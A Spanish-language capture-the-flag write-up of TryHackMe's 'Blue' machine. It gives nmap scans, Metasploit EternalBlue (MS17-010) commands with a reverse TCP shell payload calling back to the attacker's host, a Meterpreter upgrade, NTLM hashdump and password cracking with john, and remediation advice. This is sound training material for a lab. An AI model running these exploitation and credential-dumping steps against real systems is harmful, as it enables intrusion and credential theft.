# Write-up: Blue (TryHackMe)

**Autor:** Juan Merino Garrido
**Plataforma:** TryHackMe
**Máquina:** Blue
**Dificultad:** Fácil

Este documento detalla el proceso de escaneo, explotación y post-explotación de la máquina "Blue" de TryHackMe, centrada en la famosa vulnerabilidad MS17-010 (EternalBlue).

---

## 1. Reconocimiento y Escaneo

La fase inicial fue un escaneo de puertos con `nmap` para identificar los servicios expuestos.

**Comando:**
```bash
sudo nmap -sV -sC -Pn <IP_MAQUINA>
````

**Resultados Clave:**

| Puerto | Servicio | Versión |
| :--- | :--- | :--- |
| **445/tcp** | **microsoft-ds** | **Windows 7 Professional 7601 Service Pack 1** |
| 139/tcp | netbios-ssn | Microsoft Windows netbios-ssn |
| 3389/tcp | ms-wbt-server | Microsoft Terminal Services (RDP) |

**Análisis:** El objetivo es un **Windows 7 Professional SP1**. Esta versión es notoriamente vulnerable a **MS17-010 (EternalBlue)**.

-----

## 2\. Enumeración (Confirmación de Vulnerabilidad)

Para confirmar la sospecha, se utilizó un script específico de `nmap` (NSE) para comprobar la vulnerabilidad MS17-010.

**Comando:**

```bash
sudo nmap -Pn --script smb-vuln-ms17-010 -p445 <IP_MAQUINA>
```

**Resultado:**

```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|   State: VULNERABLE
```

El escaneo confirmó que el objetivo era 100% vulnerable.

-----

## 3\. Explotación (Metasploit)

Se utilizó Metasploit Framework para explotar esta vulnerabilidad.

1.  **Iniciar Metasploit:** `msfconsole`
2.  **Seleccionar Exploit:** `use exploit/windows/smb/ms17_010_eternalblue`
3.  **Configurar Opciones:**
      * `set RHOSTS <IP_MAQUINA>` (IP de la víctima)
      * `set LHOST <TU_IP_TUN0>` (IP del atacante, `tun0`)

### Ajuste del Payload

El *payload* por defecto (`meterpreter`) falló. Se realizó un *troubleshooting* y se cambió a un *payload* de *shell* simple de 64 bits, que tuvo éxito.

  * **Configurar Payload:** `set PAYLOAD windows/x64/shell/reverse_tcp`

### Ejecución del Exploit

Se lanzó el *exploit* con el *payload* corregido.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

**Resultado:**

```
[*] ETERNALBLUE overwrite completed successfully
[*] Command shell session 1 opened (<TU_IP_TUN0>:4444 -> <IP_MAQUINA>:49168)
...
C:\Windows\system32>
```

Se obtuvo una *shell* de comandos remota.

-----

## 4\. Post-Explotación

La *shell* obtenida se ejecutó directamente con los privilegios más altos del sistema.

**Comprobación:**

```
C:\Windows\system32>whoami
whoami
nt authority\system
```

### Actualización a Meterpreter

Para obtener más funcionalidad, la *shell* simple se actualizó a una sesión de Meterpreter usando el módulo `post/multi/manage/shell_to_meterpreter`.

### Obtención de Hashes

Una vez en la sesión de Meterpreter, se utilizó el comando `hashdump` para extraer los hashes NTLM del sistema.

### Crackeo de Hashes

El hash NTLM del usuario se guardó en un archivo (`hashes.txt`) y se crackeó localmente usando `john --format=NT --wordlist=...`.

**Contraseña Crackeada:** [Aquí pones la contraseña que encontraste]

### Búsqueda de Flags

Se utilizaron los comandos `search`, `cd` y `cat` de Meterpreter para localizar y leer las tres flags en `C:\flag1.txt`, `C:\Windows\System32\config\flag2.txt` y `C:\Users\Administrator\Desktop\flag3.txt`.

-----

## 5\. Conclusiones y Remediación

  * **Vulnerabilidad Crítica:** El servicio SMBv1 del sistema Windows 7 no estaba parcheado contra la vulnerabilidad MS17-010.
  * **Solución:**
    1.  **Parchear el sistema:** Aplicar el parche de seguridad de Microsoft MS17-010.
    2.  **Deshabilitar SMBv1:** Es un protocolo obsoleto y debe deshabilitarse.

<!-- end list -->

---
